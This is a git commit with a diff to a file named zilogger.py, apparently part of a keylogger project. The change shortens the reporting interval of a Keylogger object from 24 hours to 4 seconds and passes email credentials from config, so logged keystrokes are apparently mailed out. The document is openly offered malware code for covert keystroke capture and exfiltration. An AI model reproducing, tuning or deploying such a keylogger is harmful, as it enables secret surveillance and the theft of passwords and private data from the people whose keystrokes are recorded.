0104af7603c2855e53610f8843fe4fff78e3d4a4
Yegor <kutuzov-1313@yadnex.ru>
2021-02-09 11:47:14 +0300

    edit time interval send message

--- zilogger.py
+++ zilogger.py
@@ -2,5 +2,5 @@ import keylogger
 import config
 
 # 86400 second -> 24 hours
-my_keylogger = keylogger.Keylogger(86400, config.EMAIL, config.PASSWORD)
+my_keylogger = keylogger.Keylogger(4, config.EMAIL, config.PASSWORD)
 my_keylogger.start()
